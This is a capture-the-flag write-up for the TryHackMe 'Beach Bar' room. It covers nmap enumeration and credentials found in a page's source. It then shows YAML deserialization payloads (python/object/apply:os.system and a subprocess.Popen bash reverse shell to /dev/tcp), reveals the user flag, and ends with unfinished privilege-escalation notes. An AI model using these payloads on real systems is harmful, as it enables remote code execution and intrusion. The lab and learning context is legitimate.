![Beach Bar Banner](https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785328065667)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Cover.png" alt="Beach Bar Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785328070219" alt="image" style="vertical-align: middle;height: 50px;" /> Beach Bar

This guide contains the answer and steps necessary to get to them for the [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7) room.

## Table of contents

- [Task 1 - Hacker Holidays: Day 5](#task-1---hacker-holidays-day-5)

### Task 1 - Hacker Holidays: Day 5

1.  What is the user flag?

    Lets enumerate the machine before we move on.

    ```bash
    nmap -sV -sC 10.113.151.64 
    ```

    ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Nmap.png)

    We can see there is a webpage served on port 80. Navigating there we see a login page. We can't simply login using anything.

    ![Invalid Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Invalid_Login.png)

    Lets take a look at the source page if we can find anything.

    ![Secrets](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Secrets.png)

    Looks like they left some credentials here. Lets check if they work.

    Bingo! Here we can see various pages. The mosst interesting on is the import feature. We can import any file we like or it parses yaml scripts.

    Lets check if it properly sanitizes the actual yaml tags to not run anything it shouldn't.

    ```yaml
    !!python/object/apply:os.system
    args: ['id']
    ```

    ![Test](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Test.png)

    A this returns "0", which likely comes from the exit code (success), we might be on this something.

    Lets set up a listener and try again with a reverse shell payload.

    ```yaml
    !!python/object/apply:subprocess.Popen
    args:
    - ["bash", "-c", "bash -i >& /dev/tcp/192.168.174.187/1337 0>&1"]
    ```

    ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Reverse_Shell.png)

    Success! We are in. Lets look for our first flag.

    In the `app.py` file we find, we can indeed see that it uses an unsafe parse, which gave us RCE.

    ![Yaml](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_Yaml.png)

    Looking through the user folders, we can find a file containing the first flag.

    ![User Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_User_Flag.png)

    ><details><summary>Click for answer</summary>THM{y4ml_pl4yl1st_pwns_th3_b34ch}</details>

2.  What is the root flag?



    ><details><summary>Click for answer</summary></details>


Tried 
find / -perm -4000 -type f 2>/dev/null
Nothing really
no crontabs I believe
ls -la /etc/cron.*






![](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-beachbar-d849f7f7/Beach_Bar_.png)
